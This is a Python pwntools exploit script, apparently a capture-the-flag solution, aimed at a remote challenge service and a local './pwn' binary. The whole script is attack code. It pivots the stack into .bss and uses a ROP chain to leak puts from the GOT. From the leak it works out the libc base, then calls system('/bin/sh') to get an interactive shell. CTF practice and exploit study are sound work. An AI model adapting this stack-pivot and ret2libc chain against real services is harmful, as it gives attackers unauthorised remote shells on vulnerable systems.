from pwn import *
context.terminal = ['terminator', '-x', 'sh', '-c']
_remote = 1
if _remote:
    io = remote("handsomedog.top", 10002)
else:
    io = process("./pwn")
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

bss_adr     = 0x00000000006010a0
pop_rdi     = 0x0000000000400783
pop_rbp     = 0x00000000004005d0
pop_rsi_r   = 0x0000000000400781
leave_ret   = 0x00000000004006c8

puts_got    = elf.got["puts"]
puts_plt    = elf.plt['puts']
read_plt    = elf.plt["read"]

bss  = p64(pop_rbp) + p64(bss_adr+0x300) + p64(leave_ret)
bss  = bss.ljust(0x308, 'A')
bss += p64(pop_rdi) + p64(puts_got ) + p64(puts_plt)
bss += p64(pop_rsi_r) + p64(bss_adr+0x500) + "A"*8 + p64(pop_rdi) + p64(0) + p64(read_plt)
bss += p64(pop_rbp) + p64(bss_adr+0x500-8) + p64(leave_ret)
io.sendafter("Name:\n", bss)
payload = "A"*0x20 + p64(bss_adr - 8) + p64(leave_ret)
#gdb.attach(io, "b *0x4006c9")
#pause()
io.sendafter("Buffer:\n", payload)
leak = io.recvuntil("\n", drop=True)
leak = u64(leak.ljust(8, '\x00'))
base = leak - libc.sym["puts"]
success("libc: 0x%x"%base)
binsh = base + next(libc.search("/bin/sh"))
system = base + libc.sym["system"]
bss  = p64(pop_rdi) + p64(binsh) + p64(system)
io.send(bss)
io.interactive()

